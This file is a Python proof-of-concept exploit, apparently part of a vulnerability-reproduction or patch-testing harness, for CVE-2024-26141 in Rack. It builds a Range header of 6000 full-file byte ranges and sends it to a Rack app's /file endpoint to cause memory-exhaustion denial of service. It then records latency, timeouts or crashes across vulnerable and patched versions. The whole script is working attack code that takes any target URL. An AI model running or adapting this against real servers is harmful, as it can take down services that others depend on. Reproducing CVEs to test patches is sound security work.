#!/usr/bin/env python3
"""[GIVEN] original_poc — CVE-2024-26141 seed exploit, delivered over EXTERNAL HTTP.

Sends the CVE-2024-26141 byte-range DoS vector to the REAL running Rack web app: an HTTP
`GET /file` whose `Range:` header is 6000 copies of the FULL-file range (bytes=0-899999). The
TOTAL byte coverage is 6000 * 900000 = 5.4 GB, hugely more than the 900000-byte file, so
Rack::Files (on a version with no total-coverage guard) tries to assemble a multi-GB
multipart/byteranges body -> memory-exhaustion DoS, measured as server-side latency.

Expected: SLOW / CRASH (OOM, connection reset) on V0 (rack 3.0.9); BOUNDED on V1 (rack 3.1.20),
where CVE-2024-26141 added `return [] if ranges.map(&:size).sum > size` -> the range set is
rejected -> HTTP 416 (fast). (On V2 the max_ranges:100 count cap makes it 200/whole-file, fast.)

Usage: original_poc.py http://127.0.0.1:28241
"""
import http.client
import socket
import sys
import time

FILE_SIZE = 900000
N_ORIG = 6000
HTTP_TIMEOUT_S = 15.0
HEADER = "bytes=" + ",".join([f"0-{FILE_SIZE - 1}"] * N_ORIG)   # total coverage 5.4 GB >> file


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("GET", "/file", headers={"Range": HEADER})
        r = c.getresponse()
        total = 0
        while True:
            chunk = r.read(1 << 16)
            if not chunk:
                break
            total += len(chunk)
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "status": r.status, "bytes": total, "crash": False}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "status": "TIMEOUT", "crash": False, "timeout": True}
    except (ConnectionResetError, BrokenPipeError, http.client.RemoteDisconnected,
            http.client.IncompleteRead, ConnectionError, OSError) as e:
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "status": f"CRASH:{type(e).__name__}", "crash": True}


if __name__ == "__main__":
    import json
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:28241"
    out = run(base)
    print(json.dumps({"poc": "original/CVE-2024-26141", "header_bytes": len(HEADER),
                      "n_ranges": N_ORIG, "target": base, **out}, indent=2))
